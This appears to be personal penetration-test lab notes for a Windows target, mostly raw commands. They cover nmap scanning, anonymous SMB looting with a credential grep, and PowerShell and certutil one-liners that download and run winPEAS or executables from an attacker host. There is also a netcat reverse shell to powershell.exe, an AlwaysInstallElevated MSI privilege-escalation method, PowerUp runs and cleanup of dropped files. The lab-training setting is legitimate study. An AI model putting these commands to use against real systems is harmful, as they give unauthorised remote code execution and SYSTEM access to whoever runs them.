```JavaScript
sudo nmap $IP -p- -sV -sS 
```

```JavaScript
smbclient -U ''  -L \\\\$IP\\ 
smbclient -U ''  \\\\$IP\\Shenzi 
recurse
prompt off
mget *
grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)'
```

just download or download and exec

```JavaScript
powershell -c "(New-Object Net.WebClient).DownloadFile('http://192.168.45.162:8000/winPEAS.ps1', 'C:\Windows\Temp\wp.ps1'); powershell -ep bypass -c C:\Windows\Temp\wp.ps1"
```

```JavaScript
powershell -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.162:8000/winPEAS.ps1')"
```

```JavaScript
rpcclient -U '' -N $IP
```

```JavaScript
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.45.162:8000/s.exe', 'C:\Windows\Temp\s.exe'); Start-Process 'C:\Windows\Temp\s.exe'"
```

[http://$IP/WP-Root-Install/themes/theme-year-name/404.php](http://$ip/WP-Root-Install/themes/theme-year-name/404.php)

try if smb can write

  

![[/image 2.png|image 2.png]]

  

  

  

rlwrap : A wrapper that provides readline functionality (command history, line editing) to commands

sudo rlwrap nc -lnvp 135

- l : Listen mode, for inbound connections
- n : Don't do DNS lookups
- v : Verbose output

stands for "ReadLine Wrapper".

rlwrap is useful when using netcat because it:

1. Provides command line history (using up/down arrow keys)
2. Allows line editing (left/right arrows, backspace)
3. Enables command recall and modification
4. Makes the shell experience more user-friendly when someone connects

rlwrap ：提供指令 readline 功能（指令記錄、行編輯）的包裝器

sudo rlwrap nc -lnvp 135

- l ：監聽模式，用於入站連接  
    -n：不進行 DNS 查找  
    -v ：詳細輸出

rlwrap 在使用 netcat 時很有用，因為它：

1.提供命令列歷史記錄（使用向上/向下箭頭鍵）  
2. 允許行編輯（左/右箭頭、退格鍵）  
3. 支援命令調用與修改  
4. 當有人連線時，讓 shell 體驗更加用戶友好

  

  

=========|| Always Install Elevated Check  
Checking Windows Installer Registry (will populate if the key exists)  
HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer).AlwaysInstallElevated = 1  
Try msfvenom msi package to escalate  
[https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#metasploit-payloads](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#metasploit-payloads)  
HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer).AlwaysInstallElevated = 1  
Try msfvenom msi package to escalate  
[https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#metasploit-payloads](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#metasploit-payloads)

  

grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)' /path/to/downloaded/files

  

the path for wp

# http://$IP/WP-Root-Install/themes/theme-year-name/404.php

  

```Bash
certutil.exe -urlcache -f http://192.168.45.165/winPEAS.bat C:\Windows\Temp\winPEAS.bat & C:\Windows\Temp\winPEAS.bat
```

```Bash
curl http://192.168.45.222:8000/nc/nc64.exe -o nc64.exe & nc64.exe 192.168.45.222 -e powershell.exe
```

```Bash
certutil.exe -urlcache -f http://192.168.45.165/shell.msi C:\Windows\Temp\shell.msi & C:\Windows\Temp\shell.msi
```

  

When the AlwaysInstallElevated registry key is set to 1 in both HKLM and HKCU , it means that Windows Installer (MSI files) will run with elevated privileges (as Administrator or SYSTEM) regardless of the user's actual privilege level. This is a misconfiguration that allows standard users to install applications with administrative rights.

How to Exploit:

You can exploit this by creating a malicious .msi file that, when installed, executes code with elevated privileges. Common payloads include:

1. Adding a user to the Administrators group.
2. Executing a reverse shell with elevated privileges.
3. Creating a service that runs as SYSTEM.  
    Since you have a file named `shell.msi` in your workspace, it is highly probable that this file is a malicious MSI payload designed to exploit this vulnerability. You can likely execute this .msi file on the target system to gain elevated privileges.

To exploit this, you would typically transfer your malicious .msi file to the target machine and then execute it using msiexec :

  

to find the path of nc

```Bash
Get-ChildItem -Path C:\ -Filter nc.exe -Recurse -ErrorAction SilentlyContinue
```

```Bash
Remove-Item -Path "C:\path\to\your\file.ext" -Force

Remove-Item -Path ".\nc64.exe" -Force

del /f "filename.ext"
```

  

```Bash
curl http://192.168.45.222:8000/nc/nc64.exe -o nc64.exe & nc64.exe 192.168.45.222 135 -e powershell.exe
```

```Bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck" 
```

```Bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck | Out-File -FilePath 'PrivescCheck_Results.txt'"
```

PowerSploit.psd1

```Bash
powershell -ep bypass -c ". .\PowerSploit.psd1; Invoke-PowerSploit" 
```

```Bash
AlwaysInstallElevated!!!!
```

```Bash
powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
```